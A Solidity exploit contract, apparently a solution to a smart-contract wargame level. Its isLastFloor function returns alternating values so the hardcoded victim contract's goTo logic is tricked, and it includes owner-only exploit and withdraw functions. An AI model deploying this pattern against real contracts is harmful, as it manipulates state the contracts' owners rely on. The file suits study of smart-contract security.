// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Elevator {
    function goTo(uint _floor) public {}
}

contract Building {

    address public victimAddress;
    Elevator public contractAddress;
    address payable public owner;
    bool public flag;

    constructor() public {
        owner = msg.sender;
        victimAddress = 0xBCCe2E11B0A1208411397cdA89158713EC56ac87;
        contractAddress = Elevator(victimAddress);
        flag = true;
    }

    function changeVictimAddress(address _address) public {
        require(owner == msg.sender);
        victimAddress = _address;
        contractAddress = Elevator(victimAddress);
    }

    function withdraw() public{
        require(owner == msg.sender);
        owner.transfer(address(this).balance);
    }

    function isLastFloor(uint) external returns (bool) {
        if(flag){
            flag = false;
        }else{
            flag = true;
        }
        return flag;
    }

    function exploit() public {
        require(owner == msg.sender);
        contractAddress.goTo(3);
    }
}
